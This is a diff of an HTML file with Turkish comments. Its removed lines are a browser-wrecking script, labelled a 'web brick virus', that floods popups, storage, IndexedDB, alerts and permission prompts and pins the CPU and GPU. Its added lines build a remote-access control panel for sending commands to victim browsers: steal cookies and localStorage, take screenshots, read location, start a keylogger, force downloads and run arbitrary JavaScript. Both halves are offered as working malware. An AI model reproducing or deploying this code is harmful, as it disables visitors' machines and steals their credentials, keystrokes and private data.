@@ -2,248 +2,258 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>EL CIENCO WEB VIRUS</title>
+<title>EL CIENCO RAT CONTROL PANEL</title>
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
 body {
-    background: black;
-    overflow: hidden;
-    position: fixed;
-    width: 100%;
-    height: 100%;
-}
-
-.virus-text {
-    position: absolute;
-    color: red;
+    background: #0a0a0a;
+    color: #0f0;
     font-family: monospace;
-    font-size: 20px;
-    font-weight: bold;
-    text-shadow: 0 0 5px red;
-    white-space: nowrap;
-    z-index: 10000;
-    animation: blink 0.1s infinite;
+    margin: 0;
+    padding: 20px;
 }
-
-@keyframes blink {
-    0% { opacity: 1; }
-    50% { opacity: 0; }
-    100% { opacity: 1; }
+.container {
+    max-width: 1400px;
+    margin: 0 auto;
 }
-
-.blur-layer {
-    position: fixed;
-    top: 0;
-    left: 0;
+.header {
+    border-bottom: 1px solid #0f0;
+    padding-bottom: 10px;
+    margin-bottom: 20px;
+}
+h1 {
+    color: #f00;
+    margin: 0;
+}
+.status {
+    color: #0f0;
+    font-size: 12px;
+}
+.command-panel {
+    background: #1a1a1a;
+    border: 1px solid #0f0;
+    padding: 15px;
+    margin-bottom: 20px;
+}
+textarea {
     width: 100%;
-    height: 100%;
-    background: rgba(255,0,0,0.3);
-    z-index: 9999;
-    pointer-events: none;
+    height: 100px;
+    background: #2a2a2a;
+    color: #0f0;
+    border: 1px solid #0f0;
+    font-family: monospace;
+    padding: 10px;
+}
+select, input, button {
+    background: #2a2a2a;
+    color: #0f0;
+    border: 1px solid #0f0;
+    padding: 8px;
+    margin: 5px;
+    font-family: monospace;
+    cursor: pointer;
+}
+button:hover {
+    background: #0f0;
+    color: #000;
+}
+.clients {
+    background: #1a1a1a;
+    border: 1px solid #0f0;
+    padding: 15px;
+    margin-bottom: 20px;
+    max-height: 300px;
+    overflow-y: auto;
+}
+.client-item {
+    border-bottom: 1px solid #333;
+    padding: 10px;
+    cursor: pointer;
+}
+.client-item:hover {
+    background: #2a2a2a;
+}
+.client-item.selected {
+    background: #0f0;
+    color: #000;
+}
+.output {
+    background: #1a1a1a;
+    border: 1px solid #0f0;
+    padding: 15px;
+    height: 300px;
+    overflow-y: auto;
+    font-size: 12px;
+}
+.log-line {
+    border-bottom: 1px solid #333;
+    padding: 5px;
+    font-family: monospace;
 }
 </style>
 </head>
 <body>
-<div class="blur-layer"></div>
+<div class="container">
+    <div class="header">
+        <h1>EL CIENCO WEB RAT - CONTROL PANEL</h1>
+        <div class="status">Status: ACTIVE | Listening for connections</div>
+    </div>
+    
+    <div class="command-panel">
+        <h3>COMMAND EXECUTION</h3>
+        <select id="clientSelect">
+            <option value="all">ALL CLIENTS</option>
+        </select>
+        <select id="commandType">
+            <option value="js">JavaScript Kodu</option>
+            <option value="screenshot">Ekran Görüntüsü Al</option>
+            <option value="getCookies">Çerezleri Al</option>
+            <option value="getLocalStorage">LocalStorage Al</option>
+            <option value="getLocation">Konum Al</option>
+            <option value="getUserAgent">Tarayıcı Bilgisi Al</option>
+            <option value="redirect">Yönlendir</option>
+            <option value="alert">Alert Göster</option>
+            <option value="download">Dosya İndirt</option>
+            <option value="keylogStart">Keylogging Başlat</option>
+            <option value="keylogStop">Keylogging Durdur</option>
+            <option value="selfDestruct">Kendini Yok Et</option>
+        </select>
+        <input type="text" id="commandParam" placeholder="Parametre (opsiyonel)" style="width: 300px;">
+        <button onclick="sendCommand()">GÖNDER</button>
+        <button onclick="refreshClients()">REFRESH</button>
+    </div>
+    
+    <div class="clients">
+        <h3>CONNECTED CLIENTS</h3>
+        <div id="clientList">No clients connected</div>
+    </div>
+    
+    <div class="output">
+        <h3>OUTPUT</h3>
+        <div id="output"></div>
+    </div>
+</div>
+
 <script>
-(function() {
-    // EL CIENCO WEB BRICK VIRUS
-    // Hedef: Ziyaretçinin tarayıcısı + sistemi
+// RAT Kontrol Sunucusu
+var clients = {};
+var selectedClient = "all";
+var serverId = "rat_" + Math.random().toString(36).substr(2, 8);
+
+function log(message, type) {
+    var output = document.getElementById("output");
+    var div = document.createElement("div");
+    div.className = "log-line";
+    div.style.color = type === "error" ? "#f00" : (type === "success" ? "#0f0" : "#0ff");
+    div.innerHTML = "[" + new Date().toLocaleTimeString() + "] " + message;
+    output.appendChild(div);
+    output.scrollTop = output.scrollHeight;
+}
+
+function refreshClients() {
+    var select = document.getElementById("clientSelect");
+    select.innerHTML = '<option value="all">ALL CLIENTS</option>';
     
-    var msg = "EL CIENCO WEB VIRUS ACTIVE SYSTEM BRICKED ";
-    var colors = ["red", "#ff0000", "#cc0000", "#990000", "#ff3300"];
-    
-    // 1. Sonsuz popup penceresi
-    function spamPopups() {
-        while(true) {
-            var win = window.open("about:blank", "_blank", "width=200,height=100");
-            if(win) {
-                win.document.write('<body style="background:red;color:white;font-size:30px">BRICKED</body>');
-            }
-        }
+    for(var id in clients) {
+        var option = document.createElement("option");
+        option.value = id;
+        option.text = id + " | " + clients[id].ua.substring(0, 50);
+        select.appendChild(option);
     }
     
-    // 2. Ekranı spam mesajlarla doldur
-    function screenSpam() {
-        for(var i = 0; i < 500; i++) {
+    var listDiv = document.getElementById("clientList");
+    if(Object.keys(clients).length === 0) {
+        listDiv.innerHTML = "No clients connected";
+    } else {
+        listDiv.innerHTML = "";
+        for(var id in clients) {
             var div = document.createElement("div");
-            div.className = "virus-text";
-            div.innerHTML = msg;
-            div.style.left = Math.random() * window.innerWidth + "px";
-            div.style.top = Math.random() * window.innerHeight + "px";
-            div.style.fontSize = (Math.random() * 30 + 10) + "px";
-            div.style.color = colors[Math.floor(Math.random() * colors.length)];
-            div.style.transform = "rotate(" + (Math.random() * 360) + "deg)";
-            document.body.appendChild(div);
+            div.className = "client-item";
+            div.innerHTML = "<b>" + id + "</b><br>" + clients[id].ua + "<br>IP: " + clients[id].ip;
+            div.onclick = (function(cid) {
+                return function() {
+                    selectedClient = cid;
+                    log("Selected client: " + cid, "success");
+                };
+            })(id);
+            listDiv.appendChild(div);
         }
-        requestAnimationFrame(screenSpam);
     }
+}
+
+function sendCommand() {
+    var clientId = document.getElementById("clientSelect").value;
+    var cmdType = document.getElementById("commandType").value;
+    var cmdParam = document.getElementById("commandParam").value;
     
-    // 3. Tarayıcı localStorage ve sessionStorage temizleme + doldurma
-    function destroyStorage() {
-        try {
-            localStorage.clear();
-            sessionStorage.clear();
-            for(var i = 0; i < 10000; i++) {
-                localStorage.setItem("brick_" + i, msg.repeat(100));
-                sessionStorage.setItem("brick_" + i, msg.repeat(100));
-            }
-        } catch(e) {}
+    var command = {
+        type: cmdType,
+        param: cmdParam,
+        sender: serverId
+    };
+    
+    // Komutu hedef client'a gönder
+    if(clientId === "all") {
+        for(var id in clients) {
+            sendToClient(id, command);
+        }
+        log("Command sent to ALL clients: " + cmdType, "success");
+    } else {
+        sendToClient(clientId, command);
+        log("Command sent to " + clientId + ": " + cmdType, "success");
     }
+}
+
+function sendToClient(clientId, command) {
+    var client = clients[clientId];
+    if(client && client.channel) {
+        client.channel.postMessage(command);
+    }
+}
+
+// BroadcastChannel ile iletişim
+var channel = new BroadcastChannel("elcienco_rat");
+
+channel.onmessage = function(e) {
+    var data = e.data;
     
-    // 4. IndexedDB bombası
-    function killIndexedDB() {
-        try {
-            var request = indexedDB.open("brick_db", 1);
-            request.onsuccess = function(e) {
-                var db = e.target.result;
-                for(var i = 0; i < 100; i++) {
-                    var store = db.createObjectStore("store_" + i, {keyPath: "id"});
-                    for(var j = 0; j < 1000; j++) {
-                        store.add({id: j, data: msg.repeat(1000)});
-                    }
-                }
-                db.close();
+    if(data.type === "register") {
+        if(!clients[data.clientId]) {
+            clients[data.clientId] = {
+                id: data.clientId,
+                ua: data.userAgent,
+                ip: data.ip,
+                channel: null,
+                lastSeen: Date.now()
             };
-        } catch(e) {}
-    }
-    
-    // 5. Web Worker spam (CPU kilitleme)
-    function cpuKiller() {
-        var workerCode = "while(true){}";
-        var blob = new Blob([workerCode], {type: "application/javascript"});
-        for(var i = 0; i < navigator.hardwareConcurrency * 2; i++) {
-            var url = URL.createObjectURL(blob);
-            var worker = new Worker(url);
-            workers.push(worker);
+            log("New client connected: " + data.clientId, "success");
+            refreshClients();
         }
     }
     
-    // 6. Tüm linkleri ve formları boz
-    function destroyLinks() {
-        var links = document.getElementsByTagName("a");
-        var forms = document.getElementsByTagName("form");
-        for(var i = 0; i < links.length; i++) {
-            links[i].href = "javascript:void(0)";
-            links[i].onclick = function() { return false; };
-        }
-        for(var i = 0; i < forms.length; i++) {
-            forms[i].onsubmit = function() { return false; };
-            forms[i].action = "";
+    else if(data.type === "response") {
+        log("Response from " + data.clientId + ":\n" + JSON.stringify(data.result, null, 2), "info");
+    }
+    
+    else if(data.type === "heartbeat") {
+        if(clients[data.clientId]) {
+            clients[data.clientId].lastSeen = Date.now();
         }
     }
-    
-    // 7. Sonsuz alert (kullanıcıyı engelle)
-    function infiniteAlert() {
-        setInterval(function() {
-            alert("EL CIENCO - SYSTEM BRICKED");
-        }, 1);
-    }
-    
-    // 8. Konsolu spam ile doldur
-    function consoleSpam() {
-        setInterval(function() {
-            console.log(msg.repeat(50));
-            console.error(msg.repeat(50));
-            console.warn(msg.repeat(50));
-        }, 1);
-    }
-    
-    // 9. WebGL bombası (GPU kilitleme)
-    function killGPU() {
-        var canvas = document.createElement("canvas");
-        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        if(gl) {
-            var vertices = [];
-            for(var i = 0; i < 1000000; i++) {
-                vertices.push(Math.random(), Math.random(), Math.random());
-            }
-            var buffer = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);
-            for(var frame = 0; frame < 1000; frame++) {
-                gl.clear(gl.COLOR_BUFFER_BIT);
-                gl.drawArrays(gl.TRIANGLES, 0, vertices.length / 3);
-            }
+};
+
+// Periyodik temizlik
+setInterval(function() {
+    var now = Date.now();
+    for(var id in clients) {
+        if(now - clients[id].lastSeen > 60000) {
+            delete clients[id];
+            log("Client disconnected: " + id, "error");
+            refreshClients();
         }
     }
-    
-    // 10. Geolocation spam
-    function geoSpam() {
-        setInterval(function() {
-            navigator.geolocation.getCurrentPosition(function(){}, function(){});
-        }, 10);
-    }
-    
-    // 11. WebRTC kamera/mikrofon isteği spam
-    function mediaSpam() {
-        setInterval(function() {
-            navigator.mediaDevices.getUserMedia({video: true, audio: true}).then(function(){}, function(){});
-        }, 100);
-    }
-    
-    // 12. Tüm sesleri çal (iğrenç ses)
-    function audioSpam() {
-        var AudioContext = window.AudioContext || window.webkitAudioContext;
-        if(AudioContext) {
-            var ctx = new AudioContext();
-            for(var i = 0; i < 100; i++) {
-                var osc = ctx.createOscillator();
-                osc.frequency.value = Math.random() * 2000;
-                osc.connect(ctx.destination);
-                osc.start();
-                osc.stop(0.05);
-            }
-        }
-    }
-    
-    // 13. Sayfa geçmişini boz (ileri/geri butonlarını kilit)
-    function breakHistory() {
-        for(var i = 0; i < 100; i++) {
-            history.pushState({}, "", "/brick_" + i);
-        }
-        window.onpopstate = function() {
-            history.go(1);
-        };
-    }
-    
-    // 14. CSS animasyon bombası (render kilitleme)
-    function cssBomb() {
-        var style = document.createElement("style");
-        style.innerHTML = "* { animation: virus-shake 0.01s infinite; } @keyframes virus-shake { 0% { transform: translate(0,0); } 100% { transform: translate(100px,100px); } }";
-        document.head.appendChild(style);
-    }
-    
-    // 15. Bootstrap saldırısı
-    function start() {
-        screenSpam();
-        destroyStorage();
-        killIndexedDB();
-        destroyLinks();
-        infiniteAlert();
-        consoleSpam();
-        killGPU();
-        geoSpam();
-        mediaSpam();
-        audioSpam();
-        breakHistory();
-        cssBomb();
-        
-        setTimeout(function() {
-            location.reload();
-        }, 5000);
-    }
-    
-    var workers = [];
-    cpuKiller();
-    start();
-    spamPopups();
-})();
+}, 30000);
+
+log("Control panel ready. Server ID: " + serverId, "success");
 </script>
 </body>
-  </html>
+</html>
